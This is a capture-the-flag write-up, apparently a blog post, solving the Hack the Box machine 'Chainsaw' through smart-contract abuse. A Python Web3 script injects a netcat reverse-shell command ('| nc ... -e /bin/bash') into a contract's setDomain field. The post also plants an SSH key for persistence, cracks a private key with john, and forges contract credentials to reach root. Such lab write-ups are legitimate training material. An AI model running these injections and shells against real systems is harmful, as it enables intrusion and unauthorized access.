+++
author = "Nick"
categories = ["blockchain", "reverse shell", "netcat", "python", "base64", "etherium", "tcpdump", "api", "chainsaw", "JSON", "solidity", "ssh", "ssh-keygen", "LinEnum", "IPFS", "ssh2john", "john", "smbmap"]
date = 2019-11-23T15:27:00Z
description = ""
draft = false
thumbnail = "/images/2019/09/info-2.png"
slug = "hack-the-box-chainsaw"
summary = "We are back with another Hack the Box. We are going to tackle the machine Chainsaw. Lets see what's in store!"
tags = ["blockchain", "reverse shell", "netcat", "python", "base64", "etherium", "tcpdump", "api", "chainsaw", "JSON", "solidity", "ssh", "ssh-keygen", "LinEnum", "IPFS", "ssh2john", "john", "smbmap"]
title = "Hack the Box - Chainsaw"

+++


We are back with another Hack the Box. We are going to tackle the machine Chainsaw. Lets see what's in store!

As usual we start off with our standard nmap scan, ```nmap -sC -sV -oA chainsaw 10.10.10.142```.

```
Nmap scan report for 10.10.10.142
Host is up (0.058s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 1001     1001        23828 Dec 05  2018 WeaponizedPing.json
| -rw-r--r--    1 1001     1001          243 Dec 12  2018 WeaponizedPing.sol
|_-rw-r--r--    1 1001     1001           44 Sep 18 04:12 address.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.235
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:dd:8a:5d:3c:78:d4:41:ff:bb:27:39:c1:a2:4f:eb (RSA)
|   256 3d:71:ff:d7:29:d5:d4:b2:a6:4f:9d:eb:91:1b:70:9f (ECDSA)
|_  256 7e:02:da:db:29:f9:d2:04:63:df:fc:91:fd:a2:5a:f2 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.77 seconds
```
These results are pretty limited, so we'll run it again against all ports. ```nmap -sC -sV -T4 -p- -oA chainsaw_all 10.10.10.142``` gives us one additional port.

```
Nmap scan report for 10.10.10.142
Host is up (0.056s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 1001     1001        23828 Dec 05  2018 WeaponizedPing.json
| -rw-r--r--    1 1001     1001          243 Dec 12  2018 WeaponizedPing.sol
|_-rw-r--r--    1 1001     1001           44 Sep 18 04:12 address.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.235
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:dd:8a:5d:3c:78:d4:41:ff:bb:27:39:c1:a2:4f:eb (RSA)
|   256 3d:71:ff:d7:29:d5:d4:b2:a6:4f:9d:eb:91:1b:70:9f (ECDSA)
|_  256 7e:02:da:db:29:f9:d2:04:63:df:fc:91:fd:a2:5a:f2 (ED25519)
9810/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 400 Bad Request
|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: *
|     Content-Type: text/plain
|     Date: Wed, 18 Sep 2019 15:08:58 GMT
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.1 400 Bad Request
|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: *
|     Content-Type: text/plain
|     Date: Wed, 18 Sep 2019 15:08:56 GMT
|     Connection: close
|     Request
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: *
|     Content-Type: text/plain
|     Date: Wed, 18 Sep 2019 15:08:56 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9810-TCP:V=7.80%I=7%D=9/18%Time=5D824860%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,118,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nAccess-Control-Allo
SF:w-Headers:\x20Origin,\x20X-Requested-With,\x20Content-Type,\x20Accept,\
SF:x20User-Agent\r\nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Control-A
SF:llow-Methods:\x20\*\r\nContent-Type:\x20text/plain\r\nDate:\x20Wed,\x20
SF:18\x20Sep\x202019\x2015:08:56\x20GMT\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(HTTPOptions,100,"HTTP/1\.1\x20200\x20OK\r\nAcces
SF:s-Control-Allow-Headers:\x20Origin,\x20X-Requested-With,\x20Content-Typ
SF:e,\x20Accept,\x20User-Agent\r\nAccess-Control-Allow-Origin:\x20\*\r\nAc
SF:cess-Control-Allow-Methods:\x20\*\r\nContent-Type:\x20text/plain\r\nDat
SF:e:\x20Wed,\x2018\x20Sep\x202019\x2015:08:56\x20GMT\r\nConnection:\x20cl
SF:ose\r\n\r\n")%r(FourOhFourRequest,118,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nAccess-Control-Allow-Headers:\x20Origin,\x20X-Requested-With,\x20
SF:Content-Type,\x20Accept,\x20User-Agent\r\nAccess-Control-Allow-Origin:\
SF:x20\*\r\nAccess-Control-Allow-Methods:\x20\*\r\nContent-Type:\x20text/p
SF:lain\r\nDate:\x20Wed,\x2018\x20Sep\x202019\x2015:08:58\x20GMT\r\nConnec
SF:tion:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.09 seconds
```

Well we are going to connect to the FTP services that lets us log in as anonymous and see what these files are. ```mget *``` downloads all our files for us. We open the files and see that we have a Solidity program for an Etherium based smart contract.

![](/images/2019/09/image-30.png)

So it's very likley we are going to have to leverage this smart contract, cleverly named, WeaponizedPing to gain entry. Assumably, the ```setDomain``` function of the contract will let us change our target. After doing some research, I found the [Web3](https://web3py.readthedocs.io/en/stable/index.html) framework for interacting with the Etherium Blockchain. Now we'll have to craft a program to connect to the blockchain and utilized the smart contract.

We will have the contract use our machine as the target and we can verify that it is pinging back to us by using ```tcpdump```.

![](/images/2019/09/image-31.png)

Now we can tell our payload to make a Netcat connection back to our machine. My code looks like this:

```python
#!/bin/python
import sys
import json
from web3 import Web3

#connect to chainsaw machine
url = "http://10.10.10.142:9810"
web3 = Web3(Web3.HTTPProvider(url))
web3.eth.defaultAccount = web3.eth.accounts[0]

#define our contract things
wallet = '0x210d731a66fB25DE43c09e3Eb9B56000876fAe8e'
abi = json.loads('[{"constant":true,"inputs":[],"name":"getDomain","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_value","type":"string"}],"name":"setDomain","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]')
byteCode = '0x60806040526040805190810160405280600a81526020017f676f6f676c652e636f6d000000000000000000000000000000000000000000008152506000908051906020019061004f929190610062565b5034801561005c57600080fd5b50610107565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106100a357805160ff19168380011785556100d1565b828001600101855582156100d1579182015b828111156100d05782518255916020019190600101906100b5565b5b5090506100de91906100e2565b5090565b61010491905b808211156101005760008160009055506001016100e8565b5090565b90565b6102d7806101166000396000f30060806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063b68d180914610051578063e5eab096146100e1575b600080fd5b34801561005d57600080fd5b5061006661014a565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a657808201518184015260208101905061008b565b50505050905090810190601f1680156100d35780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100ed57600080fd5b50610148600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506101ec565b005b606060008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156101e25780601f106101b7576101008083540402835291602001916101e2565b820191906000526020600020905b8154815290600101906020018083116101c557829003601f168201915b5050505050905090565b8060009080519060200190610202929190610206565b5050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061024757805160ff1916838001178555610275565b82800160010185558215610275579182015b82811115610274578251825591602001919060010190610259565b5b5090506102829190610286565b5090565b6102a891905b808211156102a457600081600090555060010161028c565b5090565b905600a165627a7a72305820d5d4d99bdb5542d8d65ef822d8a98c80911c2c3f15d609d10003ccf4227858660029'

#Initiate the contract
WeaponizedPing = web3.eth.contract(abi=abi, bytecode=byteCode)
contractInstance = web3.eth.contract(address=wallet,abi=abi)

newUrl = contractInstance.functions.setDomain('10.10.14.235 | nc 10.10.14.235 9001 -e /bin/bash').transact()


#Debugging things
#Print console if the connection is made
print("Are we connected: ")
print(web3.isConnected())
print("**********************************************************")
print(WeaponizedPing.address)
print("**********************************************************")
#Print the latest block on the chain to see what else might be happening
#print("The latest transaction: ")
#print(web3.eth.getBlock('latest'))
#print("*************************")
```

We run our python script and...

![](/images/2019/09/image-62.png)

We have made a reverse connection. A quick ```whoami``` shows I'm the administrator. We see that there is another user account on the system, Bobby. We'll now create an SSH keypair so that we can reliably get back into the box and not have to deal with running our script every time we want to connect.

Simply generate a keypair with ```ssh-keygen``` and append it to the authorized_keys on the target box.

![](/images/2019/09/image-63.png)

Then we simply SSH in.

![](/images/2019/09/image-64.png)

Now that we have a more consistent connection to the target. We can enumerate a little bit. We see there is a file called chainsaw-emp.csv in the administrators home directory. When we look at the contents of the file, we see its a list of people and roles. Bobby seems to be our Smart Contract Auditor.

![](/images/2019/09/image-65.png)

We will start enumerating the box. We'll use ```LinEnum``` to start and see what it shows. If that doesn't yeild anything, we'll then kick up ```PsPy64``` and see if anything pops up there. While we are doing those, some manual enumeration shows that there is a ```.ipfs``` directory for the user. If you are unfamiliar with ```ipfs``` and what it is, this is a [good resource](https://docs.ipfs.io/introduction/how-ipfs-works/). It's essentially a peer-to-peer storage system. The hope here is that we are able to obtain some sensitive information to escalate with.

We'll start by greping the blocks of storage in for the term root. 
```grep -iRl root```. The ```-R``` for recursive. The ```i``` for ignore case and the ```l``` for any files that match the context given.

![](/images/2019/09/image-68.png" caption=")

Nothing. Next we'll check for anything Bobby.

![](/images/2019/09/image-69.png)

We see that Bobby does seem to have some matches. We can  look at the contents of these files and see what might be in them. The data listed in block OY seems to have a base64 encrypted email.

![](/images/2019/09/image-70.png)

Which decodes to:

![](/images/2019/09/image-71.png)

Awesome. We also have the key seemingly encoded as well. We'll snag the attached key and decode that base64 into our private key.

![](/images/2019/09/image-72.png)

We now have a private key for Bobby. Now we'll ship it into ```ssh2john``` to convert it over. Then we'll use john to crack it.

![](/images/2019/09/image-73.png)

Now we just tell ```john``` to go to town. ```john john_bobby --wordlist=/usr/share/wordlists/rockyou.txt```

![](/images/2019/09/image-74.png" caption="jackychain it is!)

We now have a password to go with our keypair. Lets try to SSH in as Bobby now.

![](/images/2019/09/image-75.png)

Now we are in and have our user flag! Lets keep enumerating. Like we did above, we'll use ```LinEnum```, ```PsPy64``` and more manual enumeration. An intersting folder that we find is projects. Inside that folder is a directory called ChainsawClub. When we look at the directory, we see its another smartcontract based system. This time for access to a service of some type. We see that the contract is making username and passwords.

![](/images/2019/09/image-76.png)

We'll use the same principals as we did before to create a method for connecting and leveraging this smart contract. The code looks like this:

```
python
#!/bin/python
import sys
import json
from web3 import Web3

#connect to chainsaw machine
url = "http://10.10.10.142:9810"
web3 = Web3(Web3.HTTPProvider(url))
web3.eth.defaultAccount = web3.eth.accounts[0]

#define our contract things
wallet = '0xc02aE1B4A032Fc6f8AEF2DA55Fec2b54Ab91d287' #this changes everyday or on box reset
abi = json.loads('[{"constant":true,"inputs":[],"name":"getUsername","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_value","type":"string"}],"name":"setUsername","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getPassword","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_value","type":"string"}],"name":"setPassword","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getApprove","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_value","type":"bool"}],"name":"setApprove","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"getBalance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"reset","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]')
byteCode = '0x60806040526040805190810160405280600681526020017f6e6f626f647900000000000000000000000000000000000000000000000000008152506000908051906020019061004f9291906100d4565b506040805190810160405280602081526020017f37623435356361316666636239663338323863666464653461333936313339658152506001908051906020019061009b9291906100d4565b506000600260006101000a81548160ff0219169083151502179055506103e860035560006004553480156100ce57600080fd5b50610179565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061011557805160ff1916838001178555610143565b82800160010185558215610143579182015b82811115610142578251825591602001919060010190610127565b5b5090506101509190610154565b5090565b61017691905b8082111561017257600081600090555060010161015a565b5090565b90565b6106db806101886000396000f3006080604052600436106100a4576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806312065fe0146100a957806312514bba146100d4578063290bb45314610101578063681f3e6d1461016a5780636c9c2faf146101fa5780637b30721714610225578063aa1199ea14610254578063cc8e239414610283578063d826f88f14610313578063ed59313a1461032a575b600080fd5b3480156100b557600080fd5b506100be610393565b6040518082815260200191505060405180910390f35b3480156100e057600080fd5b506100ff6004803603810190808035906020019092919050505061039d565b005b34801561010d57600080fd5b50610168600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506103d8565b005b34801561017657600080fd5b5061017f6103f2565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156101bf5780820151818401526020810190506101a4565b50505050905090810190601f1680156101ec5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561020657600080fd5b5061020f610494565b6040518082815260200191505060405180910390f35b34801561023157600080fd5b5061023a61049e565b604051808215151515815260200191505060405180910390f35b34801561026057600080fd5b506102816004803603810190808035151590602001909291905050506104b5565b005b34801561028f57600080fd5b506102986104d2565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156102d85780820151818401526020810190506102bd565b50505050905090810190601f1680156103055780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561031f57600080fd5b50610328610574565b005b34801561033657600080fd5b50610391600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506105f0565b005b6000600454905090565b6000811180156103af57506003548111155b156103d55780600360008282540392505081905550806004600082825401925050819055505b50565b80600190805190602001906103ee92919061060a565b5050565b606060008054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561048a5780601f1061045f5761010080835404028352916020019161048a565b820191906000526020600020905b81548152906001019060200180831161046d57829003601f168201915b5050505050905090565b6000600354905090565b6000600260009054906101000a900460ff16905090565b80600260006101000a81548160ff02191690831515021790555050565b606060018054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561056a5780601f1061053f5761010080835404028352916020019161056a565b820191906000526020600020905b81548152906001019060200180831161054d57829003601f168201915b5050505050905090565b60206040519081016040528060008152506000908051906020019061059a92919061060a565b506020604051908101604052806000815250600190805190602001906105c192919061060a565b5060006004819055506103e86003819055506000600260006101000a81548160ff021916908315150217905550565b806000908051906020019061060692919061060a565b5050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061064b57805160ff1916838001178555610679565b82800160010185558215610679579182015b8281111561067857825182559160200191906001019061065d565b5b509050610686919061068a565b5090565b6106ac91905b808211156106a8576000816000905550600101610690565b5090565b905600a165627a7a723058206111cc4189c2422cdf63d3b7eee439d91d39a4fee6786a615ef66d1619820dd40029'


#Initiate the contract |
ChainsawClub = web3.eth.contract(abi=abi, bytecode=byteCode)
contractInstance = web3.eth.contract(address=wallet,abi=abi)

#Call the contract url and do magic
print("Are we connected: ")
print(web3.isConnected())

#Set username
contractInstance.functions.setUsername('love').transact()
#Set password in MD5
contractInstance.functions.setPassword('b5c0b187fe309af0f4d35982fd961d7e').transact()
#Set site approval
contractInstance.functions.setApprove(True).transact()
#Make a donation
contractInstance.functions.transfer(1000).transact()
```

Something I learned while doing this is that I should have loaded the JSON file directly using this:
```
with open('/home/bobby/projects/ChainsawClub/ChainsawClub.json') as f:
        contractData = json.load(f)
        f.close()
```
I was constantly running into an error where the ABI value was not being read. I solved that issue by running the script on the target machine vs locally and reading the JSON in as such.

Now that we've made our contract interaction, lets check to see if we can get in.

![](/images/2019/09/image-77.png)

We are root! When we go to get our root flag we see the following message.

![](/images/2019/09/image-78.png)

Hmm, ok. Nothing in the file... Well, let's enumerate more! This time as Root. We snag ```LinEnum``` and let it run. It doesn't really show anything. So we do some manual enumeration of applications on the system. One of the things that I do when manual enumeration is concerned is sort by date time. So in this case, we do ```ls -rtl```. This will list everthing in reverse order of time.

![](/images/2019/09/image-79.png)

As we see, most of the items that are recently used are filesystem functions. However there is one item that isn't a normal binary to have, ```bmap```. You can take a look at [this github repo](https://github.com/CameronLonsdale/bmap) where bmap is used in a forensics sense.

Since ```root.txt``` is 52 bytes in size. that means there are still 4044 bytes left that can be used for hiding data. So we can tell bmap to read the slack space of the ```root.txt``` file.

```bmap --slack root.txt```

![](/images/2019/09/image-81.png)

There is our root flag! This was a fun machine. I am a blockchain enthusiast, so seeing it in HTB was a awesome!

Hopefully something was learned. If you found this write-up helpful, consider sending some respect my way: [Lovecore's HTB Profile](https://www.hackthebox.eu/home/users/profile/95635).

